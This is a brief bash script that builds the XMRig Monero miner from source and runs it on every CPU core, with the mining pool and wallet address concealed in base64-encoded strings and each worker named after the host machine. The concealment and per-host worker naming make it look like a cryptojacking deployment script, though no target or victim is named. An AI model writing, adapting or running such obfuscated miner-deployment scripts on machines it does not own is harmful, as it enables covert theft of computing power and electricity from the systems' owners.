#!/bin/bash
sudo apt-get update
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev msr-tools sshguard
git clone https://github.com/xmrig/xmrig.git
cd xmrig && mkdir -p build && cd build
cmake ..
make -j $(getconf _NPROCESSORS_ONLN)
sudo sysctl -w vm.nr_hugepages=256
www=`echo NDNEMXpyNGZjNHdiRzFYcXkyUDF3UWhKZ0dpMWNLTUNTZWRGM3lwbVFzNUc5ejRkNW52cUJ4bWllRUpQa2REcUduWThQeWZRQ0pLdlY0RXduaDhDQk1lTFVldkdIdXMK | base64 -d`
uuu=`uname -n`
ppp=`echo "cG9vbC5zdXBwb3J0eG1yLmNvbTozMzMzCg==" |base64 -d`
./xmrig -k -v 1 -t $(getconf _NPROCESSORS_ONLN) -o $ppp -u $www.$uuu -p x --donate-level 1 --randomx-1gb-pages
